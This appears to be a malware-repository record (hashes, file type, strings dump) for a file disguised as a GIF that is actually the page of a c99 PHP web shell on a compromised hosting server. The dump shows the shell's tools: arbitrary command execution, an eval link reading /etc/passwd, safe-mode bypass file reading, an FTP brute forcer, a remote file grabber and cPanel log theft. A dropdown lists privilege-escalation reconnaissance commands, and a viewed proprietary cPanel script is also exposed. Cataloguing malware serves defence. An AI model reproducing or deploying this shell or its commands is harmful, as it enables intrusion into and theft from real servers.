name=btnG></form>\n</center>\n    </td>\n</tr></TABLE><br>\n<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"116\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>\n<tr>\n  <td width=\"50%\" height=\"83\" valign=\"top\"><center>\n    <div align=\"center\">Php Safe-Mode Bypass (Read Files)\n    </div><br>\n    <form action=\"?\">\n      <div align=\"center\">\n      File: <input type=\"text\" name=\"file\" method=\"get\"> <input type=\"submit\" value=\"Read File\"><br><br> eg: /etc/passwd<br>\n      \n      \n      \n           \n      \n      \n      \t\n\t\n          <br>\n      </div>\n    </form>\n    </td>\n  <td width=\"50%\" height=\"83\" valign=\"top\"><center>\n   <center>Php Safe-Mode Bypass (List Directories):     <form action=\"?\">\n      <div align=\"center\"><br>\n      Dir: <input type=\"text\" name=\"directory\" method=\"get\"> <input type=\"submit\" value=\"List Directory\"><br><br> eg: /etc/<br>\n\n    </form></center>\n    </td>\n</tr></TABLE>\n<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Go Dir ::</b><form action=\"?\"><input type=hidden name=act value=\"ls\"><input type=\"text\" name=\"d\" size=\"50\" value=\"/scripts/\">&nbsp;<input type=submit value=\"Go\"></form></center></td><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Go File ::</b><form action=\"?\"><input type=hidden name=act value=\"gofile\"><input type=hidden name=\"d\" value=\"/scripts/\"><input type=\"text\" name=\"f\" size=\"50\" value=\"/scripts/\">&nbsp;<input type=submit value=\"Go\"></form></center></td></tr></table>\n</td>\n</tr>\n</TABLE>\n<br><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"990\" height=\"1\" valign=\"top\"><p align=\"center\"><b>--[ c99shell modded by synsta. | Page generation time: 0.0121 ]--</p></td></tr></table>\n<br/></body></html>"
    },
    "filename": "VirusShare_133d202e798b513b026c31891d9f4271",
    "filesize": 31350,
    "filetype": "GIF image data 3425 x 15370",
    "hashes": {
        "md5": "133d202e798b513b026c31891d9f4271",
        "sha1": "8229727812a5b47040e7c0e9c59f4c6019102162",
        "sha256": "5abcd005fea5845a235d9b6cbd5229ec7a00066666f959c97fe34fd9f1da9bf2"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "GIF89;a",
            "<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><meta http-equiv=\"Content-Language\" content=\"en-us\"><title>c99 v0.0.1 SYN-MOD [SYNSTA] @www.charmainesinclairlive.co.uk</title><STYLE>TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}</style></head><BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0><center><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor=\"#C0C0C0\"><tr><th width=\"101%\" height=\"15\" nowrap bordercolor=\"#C0C0C0\" valign=\"top\" colspan=\"2\"><p><font face=Webdings size=6><b>!</b></font><a href=\"?\"><font face=\"Verdana\" size=\"5\"><b>c99 v0.0.1 SYN-MOD [SYNSTA]</b></font></a><font face=Webdings size=6><b>!</b></font></p></center></th></tr><tr><td><p align=\"left\"><b>Software:&nbsp;Apache. <a href=\"?act=phpinfo\" target=\"_blank\"><b><u>PHP/5.2.9</u></b></a></b>&nbsp;</p><p align=\"left\"><b>uname -a:&nbsp;Linux wc3.titleworkspace.com 2.6.18-194.32.1.el5 #1 SMP Wed Jan 5 17:53:09 EST 2011 i686</b>&nbsp;</p><b>Disabled functions</b> : <b><font color=green>NONE</font></b><p align=\"left\"><b>We are: uid=608(chsclair) gid=605(chsclair) groups=605(chsclair)<br>context=system_u:system_r:crond_t:s0-s0:c0.c1023<br/>cURL: <b><font color=green>ON</font><br/>MySQL: <b><font color=green>ON</font></b><br/>MSSQL: <b><font color=red>OFF</font><br/>PostgreSQL: <b><font color=red>OFF</font><br/>Oracle: <b><font color=red>OFF</font> </b>&nbsp;</p><p align=\"left\"><b>Safe-mode:&nbsp;<font color=green>OFF (not secure)</font></b></p><p align=\"left\"><a href=\"?act=ls&d=%2F&sort=0a\"><b>/</b></a><a href=\"?act=ls&d=%2Fscripts%2F&sort=0a\"><b>scripts/</b></a>&nbsp;&nbsp;&nbsp;<b><font color=white>drwxr-xr-x</font></b><br><b>Free 6.76 GB of 7.65 GB (88.4%)</b><br><b>Your ip: <a href=http://87.177.164.235>87.177.164.235</a> - Server ip: <a href=http://109.75.162.166>109.75.162.166</a></b><br/><a href=\"?\"><hr><b>[Home]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=search&d=%2Fscripts%2F\"><b>[Search]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=fsbuff&d=%2Fscripts%2F\"><b>[Buffer]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=encoder&d=%2Fscripts%2F\"><b>[Encoder]</b></b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=tools&d=%2Fscripts%2F\"><b>[Tools]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=processes&d=%2Fscripts%2F\"><b>[Processes]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=ftpquickbrute&d=%2Fscripts%2F\"><b>[FTP Brute Forcer]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=security&d=%2Fscripts%2F\"><b>[Server Security Information]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=sql&d=%2Fscripts%2F\"><b>[SQL Manager]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=eval&d=%2Fscripts%2F&eval=readfile('/etc/passwd');\"><b>[Eval PHP code]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=selfremove\"><b>[Self remove]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=cmd&cmd=cat+%2Fvar%2Fcpanel%2Faccounting.log&cmd_txt=1&submit=Execute\"><b>[Cpanel Logs]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;</p></td></tr></table><br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"100%\" valign=\"top\"><b>Viewing file:&nbsp;&nbsp;&nbsp;&nbsp;[ensure_vhost_includes]&nbsp;ensure_vhost_includes (12.22 KB) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=white>-rwxr-xr-x</font></b><br>Select action/file-type:<br> <a href=\"?act=f&f=ensure_vhost_includes&ft=info&d=%2Fscripts%2F\"><b>[hex]</b></a> (<a href=\"?act=f&f=ensure_vhost_includes&ft=info&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=ensure_vhost_includes&ft=html&d=%2Fscripts%2F\"><b>[html]</b></a> (<a href=\"?act=f&f=ensure_vhost_includes&ft=html&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=ensure_vhost_includes&ft=txt&d=%2Fscripts%2F\"><b><u>[txt]</u></b></a> (<a href=\"?act=f&f=ensure_vhost_includes&ft=txt&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=ensure_vhost_includes&ft=code&d=%2Fscripts%2F\"><b>[Code]</b></a> (<a href=\"?act=f&f=ensure_vhost_includes&ft=code&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=ensure_vhost_includes&ft=phpsess&d=%2Fscripts%2F\"><b>[Session]</b></a> (<a href=\"?act=f&f=ensure_vhost_includes&ft=phpsess&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=ensure_vhost_includes&ft=exe&d=%2Fscripts%2F\"><b>[exe]</b></a> (<a href=\"?act=f&f=ensure_vhost_includes&ft=exe&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=ensure_vhost_includes&ft=sdb&d=%2Fscripts%2F\"><b>[SDB]</b></a> (<a href=\"?act=f&f=ensure_vhost_includes&ft=sdb&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=ensure_vhost_includes&ft=img&d=%2Fscripts%2F\"><b>[gif]</b></a> (<a href=\"?act=f&f=ensure_vhost_includes&ft=img&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=ensure_vhost_includes&ft=ini&d=%2Fscripts%2F\"><b>[ini]</b></a> (<a href=\"?act=f&f=ensure_vhost_includes&ft=ini&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=ensure_vhost_includes&ft=download&d=%2Fscripts%2F\"><b>[download]</b></a> (<a href=\"?act=f&f=ensure_vhost_includes&ft=download&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=ensure_vhost_includes&ft=notepad&d=%2Fscripts%2F\"><b>[rtf]</b></a> (<a href=\"?act=f&f=ensure_vhost_includes&ft=notepad&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=ensure_vhost_includes&ft=edit&d=%2Fscripts%2F\"><b>[change]</b></a> (<a href=\"?act=f&f=ensure_vhost_includes&ft=edit&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) |<hr size=\"1\" noshade><pre>#!/usr/bin/perl",
            "# cpanel - ensure_vhost_includes                  Copyright(c) 2010 cPanel, Inc.",
            "#                                                           All rights Reserved.",
            "# copyright@cpanel.net                                         http://cpanel.net",
            "# This code is subject to the cpanel license. Unauthorized copying is prohibited",
            "BEGIN { unshift @INC, '/usr/local/cpanel'; }",
            "# use strict;",
            "# use warnings;",
            "use Cpanel::CPAN::Getopt::Param         ();",
            "use Cpanel::EditHttpdconf               ();",
            "use Cpanel::Services                    ();",
            "use Cpanel::Config::LoadUserDomains     ();",
            "use Cpanel::DataStore                   ();",
            "use Cpanel::PwCache                     ();",
            "use Cpanel::PHPINI                      ();",
            "use Cpanel::AcctUtils::DomainOwnerCache ();",
            "use Cpanel::AcctUtils::Owner            ();",
            "use Cpanel::AdvConfig::apache::vhost    ();",
            "use Cpanel::DomainTools                 ();",
            "my %errors;",
            "my @PHP_INI_INCLUDE_PATHS_CACHE;",
            "my $php_ini_include_paths_have_been_cached = 0;",
            "Cpanel::AcctUtils::DomainOwnerCache::cachedomainowners();",
            "# Not Needed",
            "#Cpanel::AcctUtils::Owner::build_trueuserowners_cache();",
            "my %checks = (",
            "    'cp_bw_all_limit.conf' =&gt; {",
            "        'name' =&gt; 'bandwidth limit',",
            "        # 'user' ...",
            "        'domain' =&gt; {",
            "            'on' =&gt; sub {",
            "                my ( $user, $domain, $value, $verbose ) = @_;",
            "                if ( -x '/scripts/setbwlimit' ) {",
            "                    system '/scripts/setbwlimit', '--domain=' . $domain, '--limit=' . $value;",
            "                }",
            "                else {",
            "                    if ( !exists $errors{'/scripts/setbwlimit missing or not executable!'} ) {",
            "                        print &quot;/scripts/setbwlimit missing or not executable!\\n&quot;;",
            "                        $errors{'/scripts/setbwlimit missing or not executable!'} = 0;",
            "                    }",
            "                    $errors{'/scripts/setbwlimit missing or not executable!'}++;",
            "                }",
            "            },",
            "            'off' =&gt; sub {",
            "                my ( $user, $domain, $value, $verbose ) = @_;",
            "                Cpanel::EditHttpdconf::del_vhost_include(",
            "                    {",
            "                        'domain'                          =&gt; $domain,",
            "                        'file'                            =&gt; 'cp_bw_all_limit.conf',",
            "                        'restart_apache'                  =&gt; 0,",
            "                        'ensure_vhost_include_directives' =&gt; 0,",
            "                    }",
            "                );",
            "            },",
            "        },",
            "    },",
            "    'cp_jkmount.conf' =&gt; {",
            "        'name' =&gt; 'tomcat setting',",
            "        # 'user' ...",
            "        'domain' =&gt; {",
            "            'on' =&gt; sub {",
            "                my ( $user, $domain, $value, $verbose ) = @_;",
            "                if ( -x '/scripts/addservlets2' ) {",
            "                    system '/scripts/addservlets2', '--domain=' . $domain;",
            "                }",
            "                else {",
            "                    if ( !exists $errors{'/scripts/addservlets2 missing or not executable!'} ) {",
            "                        print &quot;/scripts/addservlets2 missing or not executable!\\n&quot;;",
            "                        $errors{'/scripts/addservlets2 missing or not executable!'} = 0;",
            "                    }",
            "                    $errors{'/scripts/addservlets2 missing or not executable!'}++;",
            "                }",
            "            },",
            "            'off' =&gt; sub {",
            "                my ( $user, $domain, $value, $verbose ) = @_;",
            "                Cpanel::EditHttpdconf::del_vhost_include(",
            "                    {",
            "                        'domain'                          =&gt; $domain,",
            "                        'file'                            =&gt; 'cp_jkmount.conf',",
            "                        'restart_apache'                  =&gt; 0,",
            "                        'ensure_vhost_include_directives' =&gt; 0,",
            "                    }",
            "                );",
            "            },",
            "        },",
            "    },",
            "    'cp_php_magic_include_path.conf' =&gt; {",
            "        'name' =&gt; 'magic php include path',",
            "        # 'user' ...",
            "        'domain' =&gt; {",
            "            'on' =&gt; sub {",
            "                my ( $user, $domain, $value, $verbose ) = @_;",
            "                my $homedir = ( Cpanel::PwCache::getpwnam $user )[7];",
            "                if ( !$php_ini_include_paths_have_been_cached ) {",
            "                    @PHP_INI_INCLUDE_PATHS_CACHE = Cpanel::PHPINI::include_paths();",
            "                    $php_ini_include_paths_have_been_cached++;",
            "                }",
            "                my @INCP = @PHP_INI_INCLUDE_PATHS_CACHE;",
            "                if ( $homedir &amp;&amp; $homedir ne '' &amp;&amp; $homedir ne '/' ) {",
            "                    push @INCP, $homedir . '/php';",
            "                }",
            "                my $php5path = join( ':', @INCP );",
            "                my $first_include = shift @INCP;",
            "                unshift @INCP, '/usr/local/php4/lib/php';",
            "                unshift @INCP, '/usr/php4/lib/php';",
            "                unshift @INCP, $first_include;",
            "                my $php4path = join( ':', @INCP );",
            "                my $content = &lt;&lt;&quot;END_CONT&quot;;",
            "    &lt;IfModule concurrent_php.c&gt;",
            "       php4_admin_value include_path &quot;$php4path&quot;",
            "       php5_admin_value include_path &quot;$php5path&quot;",
            "    &lt;/IfModule&gt;",
            "    &lt;IfModule !concurrent_php.c&gt;",
            "       &lt;IfModule mod_php4.c&gt;",
            "          php_admin_value include_path &quot;$php4path&quot;",
            "       &lt;/IfModule&gt;",
            "       &lt;IfModule mod_php5.c&gt;",
            "          php_admin_value include_path &quot;$php5path&quot;",
            "       &lt;/IfModule&gt;",
            "       &lt;IfModule sapi_apache2.c&gt; ",
            "          php_admin_value include_path &quot;$php4path&quot;",
            "       &lt;/IfModule&gt;",
            "    &lt;/IfModule&gt;",
            "END_CONT",
            "                Cpanel::EditHttpdconf::add_vhost_include(",
            "                    {",
            "                        'user'                            =&gt; $user,",
            "                        'file'                            =&gt; 'cp_php_magic_include_path.conf',",
            "                        'restart_apache'                  =&gt; 0,",
            "                        'ensure_vhost_include_directives' =&gt; 0,",
            "                        'content'                         =&gt; {",
            "                            'std' =&gt; {",
            "                                '1' =&gt; $content,",
            "                                '2' =&gt; $content,",
            "                            },",
            "                            'ssl' =&gt; {",
            "                                '1' =&gt; $content,",
            "                                '2' =&gt; $content,",
            "                            },",
            "                        },",
            "                    }",
            "                );",
            "                return 'once_per_user';",
            "            },",
            "            'off' =&gt; sub {",
            "                my ( $user, $domain, $value, $verbose ) = @_;",
            "                Cpanel::EditHttpdconf::del_vhost_include(",
            "                    {",
            "                        'user'                            =&gt; $user,",
            "                        'file'                            =&gt; 'cp_php_magic_include_path.conf',",
            "                        'restart_apache'                  =&gt; 0,",
            "                        'ensure_vhost_include_directives' =&gt; 0,",
            "                    }",
            "                );",
            "                return 'once_per_user';",
            "            },",
            "        },",
            "    },",
            "my $help_cr = sub {",
            "    print &lt;&lt;&quot;END_HELP&quot;;",
            "Ensure all vhost includes are setup as per userdata.",
            "$0 --help  (this screen)",
            "$0 --all-users | --user=USERNAME1 [--user=USERNAME2 --user=...] | --domain=DOMAIN1 [--domain=DOMAIN2 --domain=...]",
            "'--verbose' have output reporting what it is doing",
            "'--skip-file-check' will skip the check that makes sure the setting in the userdata reflects what is on the filesystem",
            "'--no-restart' will skip restarting Apache after httpd.conf is updated",
            "'--skip-conf-rebuild' do not rebuild httpd.conf, implies --no-restart",
            "'--debug' implies --verbose and makes the verbose information include more arcane information about what it's doing",
            "END_HELP",
            "    exit;",
            "# purposefully don't have --force-value and --only-check in help",
            "my $prm = Cpanel::CPAN::Getopt::Param-&gt;new(",
            "    {    #issafe",
            "        'help_coderef' =&gt; $help_cr,",
            "    }",
            "if ( $prm-&gt;exists_param('only-check') ) {",
            "    my %only;",
            "    for my $check ( $prm-&gt;get_param('only-check') ) {",
            "        $only{$check} = 1 if exists $checks{$check};",
            "    }",
            "    for my $real_check ( sort keys %checks ) {",
            "        delete $checks{$real_check} if !exists $only{$real_check};",
            "    }",
            "    die &quot;--only-check arguments removed all checks&quot; if !keys %checks;",
            "my %user_map = %{ Cpanel::Config::LoadUserDomains::loaduserdomains( undef, 0, 1 ) };",
            "my @users;",
            "my $do_domain_filter = 0;",
            "if ( $prm-&gt;get_param('all-users') ) {",
            "    @users = sort keys %user_map;",
            "elsif ( $prm-&gt;get_param('user') ) {",
            "    foreach my $user ( $prm-&gt;get_param('user') ) {",
            "        if ( $user &amp;&amp; defined $user_map{$user} ) {",
            "            push @users, $user;",
            "        }",
            "        else {",
            "            print &quot;Invalid user: $user\\n&quot;;",
            "        }",
            "    }",
            "    die &quot;No valid --user arguments given&quot; unless @users;",
            "elsif ( $prm-&gt;get_param('domain') ) {",
            "    $do_domain_filter = {};",
            "    for my $dom ( $prm-&gt;get_param('domain') ) {",
            "        $dom = Cpanel::DomainTools::normalize($dom);",
            "        if ( Cpanel::DomainTools::is_valid($dom) ) {",
            "            $do_domain_filter-&gt;{$dom}++;",
            "        }",
            "        else {",
            "            print &quot;Invalid domain: $dom\\n&quot;;",
            "        }",
            "    }",
            "    die &quot;No valid --domain arguments given&quot; unless keys %{$do_domain_filter};",
            "  USER_NAME:",
            "    for my $user ( keys %user_map ) {",
            "      USER_DOM:",
            "        for my $user_dom ( @{ $user_map{$user} } ) {",
            "            if ( exists $do_domain_filter-&gt;{$user_dom} ) {",
            "                push @users, $user;",
            "                next USER_NAME;",
            "            }",
            "        }",
            "    }",
            "    die &quot;--domain arguments do not belong to any user&quot; unless @users;",
            "else {",
            "    $help_cr-&gt;();",
            "my $verbose = $prm-&gt;get_param('debug') || $prm-&gt;get_param('verbose') ? 1 : 0;",
            "my %domains_processed;",
            "if ( $prm-&gt;get_param('skip-file-check') ) {",
            "    print &quot;Skipping file check as per --skip-file-check\\n\\n&quot;;",
            "else {",
            "    my $userdata = '/var/cpanel/userdata';",
            "  USER:",
            "    for my $user (@users) {",
            "        my %once;",
            "        print &quot;Starting $user...\\n&quot; if $verbose;",
            "        my $userdir = &quot;$userdata/$user&quot;;",
            "        next USER if !-d $userdir;",
            "        next USER if ref $user_map{$user} ne 'ARRAY';",
            "      DOM:",
            "        for my $dom ( sort @{ $user_map{$user} } ) {",
            "            if ( ref $do_domain_filter eq 'HASH' &amp;&amp; !exists $do_domain_filter-&gt;{$dom} ) {",
            "                print &quot;\\tProcessing $dom...\\n\\t\\tSkipping $dom since it was not passed in via --domain flag\\n&quot; if $prm-&gt;get_param('debug');",
            "                next DOM;",
            "            }",
            "            print &quot;\\tProcessing $dom...\\n&quot; if $verbose;",
            "            my $domfile = &quot;$userdir/$dom&quot;;",
            "            next DOM if !-e $domfile;",
            "            $domains_processed{$dom}++;",
            "            my $vhost_hr = Cpanel::DataStore::fetch_ref($domfile);",
            "          CHECK:",
            "            for my $check ( sort keys %checks ) {",
            "                next CHECK if exists $once{$check};",
            "                print &quot;\\t\\tChecking $checks{ $check }-&gt;{'name'}...&quot; if $verbose;",
            "                my $val = $prm-&gt;exists_param('force-value') ? $prm-&gt;get_param('force-value') : $vhost_hr-&gt;{$check};",
            "                my @args = ( $user, $dom, $val, $verbose );",
            "                my $rc;",
            "                if ($val) {",
            "                    print &quot;On\\n&quot; if $verbose;",
            "                    $rc = $checks{$check}-&gt;{'domain'}{'on'}-&gt;(@args);",
            "                }",
            "                else {",
            "                    print &quot;Off\\n&quot; if $verbose;",
            "                    $rc = $checks{$check}-&gt;{'domain'}{'off'}-&gt;(@args);",
            "                }",
            "                $once{$check} = 1 if $rc eq 'once_per_user';",
            "            }",
            "        }",
            "    }",
            "if ( $prm-&gt;get_param('skip-conf-rebuild') ) {",
            "    print &quot;Skipping httpd.conf rebuild as per --skip-conf-rebuild\\n&quot; if $verbose;",
            "    if ( $prm-&gt;get_param('skip-file-check') ) {",
            "        print &quot;Specifying both --skip-conf-rebuild and --skip-file-check means nothing was done.\\n&quot;;",
            "    }",
            "else {",
            "    print &quot;Ensuring that Include entries are correct...\\n&quot; if $verbose;",
            "    # ? other threshhold of when individual vhost building is less efficient than just rebuilding the entire httpd.conf ?",
            "    if ( keys %domains_processed &lt; 3 ) {",
            "        for my $domain ( keys %domains_processed ) {",
            "            Cpanel::AdvConfig::apache::vhost::do_vhost($domain) or warn(&quot;Could not rebuild vhost for $domain&quot;);",
            "        }",
            "    }",
            "    else {",
            "        Cpanel::EditHttpdconf::rebuild_httpd_conf(",
            "            sub {",
            "                my ( $line, $exit_loop_boolean_sr ) = @_;",
            "                return $line;    # Cpanel::SafeRun::Dynamic::livesaferun() prints whatever is returned",
            "            }",
            "        );",
            "    }",
            "    local $Whostmgr::UI::nohtml = 1;",
            "    if ( $prm-&gt;get_param('no-restart') ) {",
            "        print &quot;Skipping Apache restart as per --no-restart\\n&quot; if $verbose;",
            "    }",
            "    else {",
            "        print &quot;Restarting Apache...\\n&quot; if $verbose;",
            "        Cpanel::Services::restartservice( 'httpd', 1, 1 );",
            "    }",
            "</pre>",
            "</td></tr></table><a bookmark=\"minipanel\"><br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>",
            "<tr><td width=\"100%\" height=\"1\" valign=\"top\"><center><form action=\"?\"><input type=hidden name=act value=\"cmd\"><br/><b>CMD:</b> <input type=hidden name=\"d\" value=\"/scripts/\"><input type=\"text\" name=\"cmd\" size=\"50\" value=\"\"><input type=hidden name=\"cmd_txt\" value=\"1\">&nbsp;<input type=submit name=submit value=\"Execute\"></form></td></tr></TABLE>",
            "<br>",
            "<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>",
            "<tr>",
            " <td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: <a href=\"?act=search&d=%2Fscripts%2F\"><b>Search</b></a> ::</b><form method=\"POST\"><input type=hidden name=act value=\"search\"><input type=hidden name=\"d\" value=\"/scripts/\"><input type=\"text\" name=\"search_name\" size=\"29\" value=\"(.*)\">&nbsp;<input type=\"checkbox\" name=\"search_name_regexp\" value=\"1\"  checked> - regexp&nbsp;<input type=submit name=submit value=\"Search\"></form></center></p></td>",
            " <td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: <a href=\"?act=upload&d=%2Fscripts%2F\"><b>Upload</b></a> ::</b><form method=\"POST\" ENCTYPE=\"multipart/form-data\"><input type=hidden name=act value=\"upload\"><input type=\"file\" name=\"uploadfile\"><input type=hidden name=\"miniform\" value=\"1\">&nbsp;<input type=submit name=submit value=\"Upload\"><br><font color=red>[ Read-Only ]</font></form></center></td>",
            "</tr>",
            "</table>",
            "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Remote File Grabber ::</b><br/><br/><form action=\"?grab=true\"   method=\"post\">File Url:<input name=\"from\"> New File Name: <input name=\"to\"> <input type=\"submit\" value=\"Grab!\"></center></td></tr></table>",
            "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Make Dir ::<p><form action=\"?\"><input type=hidden name=act value=\"mkdir\"><input type=hidden name=\"d\" value=\"/scripts/\"><input type=\"text\" name=\"mkdir\" size=\"50\" value=\"/scripts/\">&nbsp;<input type=submit value=\"Create\"><br><font color=red>[ Read-Only ]</font></form></center></td><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Make File ::</b><form method=\"POST\"><input type=hidden name=act value=\"mkfile\"><input type=hidden name=\"d\" value=\"/scripts/\"><input type=\"text\" name=\"mkfile\" size=\"50\" value=\"/scripts/\"><input type=hidden name=\"ft\" value=\"edit\">&nbsp;<input type=submit value=\"Create\"><br><font color=red>[ Read-Only ]</font></form></center></td></tr></table>",
            "<br>",
            "<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"116\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>",
            "<tr>",
            "  <td width=\"50%\" height=\"83\" valign=\"top\"><center>",
            "    <div align=\"center\"><br/><b>:: Useful Commands ::</b>",
            "    </div>",
            "    <form action=\"?\">",
            "      <div align=\"center\">",
            "        <input type=hidden name=act value=\"cmd\">",
            "        <input type=hidden name=\"d\" value=\"/scripts/\">",
            " <SELECT NAME=\"cmd\">",
            "           <OPTION VALUE=\"tar -cvf NEWTAR!!.tar -c /home/chsclair/public_html/td-admin/modules/gallery_management/images",
            "\">Tar your current directory. (Only works if your dir. is writable)",
            "           <OPTION VALUE=\"pwd\">List your current directory",
            "           <OPTION VALUE=\"ls -lia\">List you current directory's files, folders, & permissions",
            "           <OPTION VALUE=\"find / -type f -perm -04000 -ls\">find suid files",
            "           <OPTION VALUE=\"find . -type f -perm -04000 -ls\">find suid files in current dir",
            "           <OPTION VALUE=\"find / -type f -perm -02000 -ls\">find sgid files",
            "           <OPTION VALUE=\"find . -type f -perm -02000 -ls\">find sgid files in current dir",
            "           <OPTION VALUE=\"uname -a\">Kernel version",
            "           <OPTION VALUE=\"w\">Logged in users",
            "           <OPTION VALUE=\"lastlog\">Last users to connect",
            "           <OPTION VALUE=\"find /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2> /dev/null\">Suid bins",
            "           <OPTION VALUE=\"cut -d: -f1,2,3 /etc/passwd | grep ::\">Users without passwords",
            "                    <OPTION VALUE=\"find /etc/ -type f -perm -o+w 2> /dev/null\">Is /etc/ writable?",
            "                    <OPTION VALUE=\"which wget curl w3m lynx\">We got downloaders? :D",
            "                    <OPTION VALUE=\"cat /proc/version /proc/cpuinfo\">CpuInfo",
